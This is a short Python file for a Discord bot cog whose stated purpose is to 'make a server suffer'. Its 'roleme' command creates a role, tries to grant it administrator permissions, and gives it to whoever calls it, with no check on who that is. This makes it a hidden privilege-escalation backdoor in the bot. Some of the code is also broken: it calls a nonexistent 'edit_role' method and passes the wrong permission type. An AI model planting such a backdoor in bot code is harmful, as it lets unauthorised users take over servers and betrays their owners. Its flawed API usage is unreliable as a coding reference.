import discord
from discord.ext import commands


class sudo:
    '''
    Developer only commands to make a server suffer
    '''

    def __init__(self,bot):
        self.bot = bot
    
    @commands.command(name='roleme')
    async def roleme(self, ctx):
        role_name = "Test"
        guild = ctx.guild
        await guild.create_role(name=role_name)
        await guild.edit_role(name=role_name, permissions=discord.PermissionOverwrite(administrator = True))
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        user = ctx.message.author
        await user.add_roles(role)



def setup(bot):
    bot.add_cog(sudo(bot))
